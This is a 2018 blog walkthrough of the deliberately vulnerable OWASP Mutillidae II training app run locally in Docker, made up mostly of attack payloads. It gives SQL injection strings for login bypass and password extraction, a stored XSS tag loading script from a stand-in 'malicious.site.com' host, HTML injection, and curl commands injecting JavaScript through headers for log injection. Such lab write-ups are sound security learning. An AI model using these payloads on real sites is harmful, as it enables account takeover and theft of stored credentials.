---
draft: false
title: "Learning web app secuiry with OWASP Mutillidae II - part 1"
slug: "mutillidae-ii-part-1"
date: "2018-01-23T14:41:50+01:00"
categories:
  - security
  - learning
tags:
    - security
    - owasp
    - mutillidae
    - pentesting
cover:
  image: /img/2018/001/owasp_full_logo.png
  caption: OWASP logo
  style: normal
---
# iNSTALLATION

Run `nowasp` container:
```bash
docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp
```

Go to [http://localhost:8888/](http://localhost:8888/), and build the DB.


# eXCERCICES:

## OWASP 2013

### A1 - Injection (SQL) - SQLi Extract data - User info

Submit the form with such query in the `Name` field:
```sql
admin'-- AND 'password='password'
```

Response should contain:
```html
Username=admin
Password=adminpass
Signature=g0t r00t?
```

### A1 - Injection (SQL) - SQLi Bypass authentication - Login

You can use the same query in the `Name` field:
```sql
admin'-- AND 'password='password'
```

After submitting the query you should see that you're logged in as...:
```
Logged In Admin: admin (g0t r00t?)
```

### A1 - Injection (SQL) - SQLi Insert Injection - Add to your blog


*Stored Cross-Site Scripting*
```html
<script src="http://malicious.site.com/bad.js"></script>
```
Once saved, check your browser's Network requests using e.g. Developer tools:

{{< gallery title="Stored Cross-Site Scripting" >}}
{{< figure link="/img/2017/002/OWASP-2013-A1-Add_to_your_blog-Stored_Cross-Site_Scripting.png" thumb="-thumb" size="1311x204" caption="Stored Cross-Site Scripting" >}}
{{< /gallery >}}

get MySQL version:
```sql
'+SUBSTRING(@@version,1,10)+'
```

Red herrings: queries that don't fail but don't give much info back:
{{< highlight sqk "linenos=table,hl_lines=14,linenostart=1" >}}
'+(SELECT IF(1=1,'true','false'))+'
'+(SELECT password FROM accounts WHERE username="root")+'
'+SUBSTRING((SELECT password FROM accounts WHERE username="root"),1,10)+'
'+(SELECT table_name FROM information_schema.tables WHERE table_schema = "nowasp.accounts")+'
'+(SELECT column_name FROM information_schema.columns WHERE table_schema = "nowasp.accounts")+'
'+SUBSTRING(SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = "nowasp.accounts",1,50)+'
'+SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name="accounts"),1,50)+'
aaa', now()); SELECT * FROM accounts; --
aaa', IF(1=1,'true','false'));#
aaa', IF(1=1, SELECT * FROM members, 'false'));#
'+ (SELECT password FROM accounts WHERE login='admin' ) +'
'+(SELECT password FROM members WHERE login="admin")+'
'+(SELECT IF(1=1,'true','false'))+'
admin'-- AND SELECT * FROM accounts;
{{< / highlight >}}


### A1 - Injection (SQL) - SQLi Insert Injection - Register for an Account

HTMLi - 
add this to the registration signature:
```html
<CANARY={}""()'';#$--/>1
```

or you can use it to plant some XSS:
```html
<CANARY={}""()'';#$--/><script>alert("welcome");</script>
```
Then log in as newly created user and see that `1` is visible next to the user name in top menu:

{{< gallery title="HTMLi" >}}
{{< figure link="/img/2017/002/OWASP-2013-A1-Add_to_your_blog-HTMLi.png" thumb="-thumb" size="1419x559" caption="HTMLi" >}}
{{< /gallery >}}

{{< pswp-init >}}


### A1 - Injection (SQL) - SQLi Insert Injection - View Captured Data

Here's one of my favs: `Application Log Injection`:   
You can send a dummy HTTP request with `User-Agent` header containing JS:
```bash
curl "http://localhost:8888/index.php?page=register.php" -H "User-Agent: <script>alert('pwnd with Application Log Injection');</script>"  &> /dev/null
```

or abuse the fact that the `endpoint` part of the URL is interpretted and logged so that we can include JS in it:
```bash
curl "http://localhost:8888/<script>alert('query_param');</script>" &> /dev/null
```

Once you send the request, then go to the [http://localhost:8888/index.php?page=show-log.php](http://localhost:8888/index.php?page=show-log.php) the alert pop-ups will appear.

*NOTES:*

* can you create an account for `root` user???

```bash
curl "http://localhost:8888/index.php?page=capture-data.php&showhints=1" -H "PHPSESSID: 5hdie94hhe7cc50pqsbvujqkb3"
```
